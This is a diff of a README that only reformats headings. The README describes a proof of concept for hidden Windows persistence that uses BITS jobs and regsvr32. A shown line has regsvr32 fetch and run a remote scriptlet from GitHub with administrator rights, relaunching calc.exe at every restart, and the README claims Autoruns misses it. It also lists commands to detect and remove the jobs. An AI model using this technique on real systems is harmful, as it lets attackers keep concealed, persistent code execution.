@@ -7,7 +7,8 @@ Author: 3gstudent@3gstudent
 
 License: BSD 3-Clause
 
-###POC
+### POC
+
 (1) First we should have the administrator's right.
 
 (2) Then run this on cmd with administrator's right:
@@ -27,12 +28,14 @@ regsvr32.exe "/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistenc
 (4) What's more,after we restart the system,the command to start a calc.exe runs again and again.
 
 
-###Impact of the issue
+### Impact of the issue
+
 Autoruns's startup monitor can't find this.
 
 Test success on Win7 、Win8、Server 2008 and so on.
 
-###Detect
+### Detect
+
 Run this to check the jobs and delete it:
 ```
 bitsadmin /list /allusers /verbose
@@ -42,5 +45,6 @@ or
 Stop Background Intelligent Transfer Service
 ```
 
-###More deatils:
+### More deatils:
+
 http://drops.wooyun.org/tips/15692
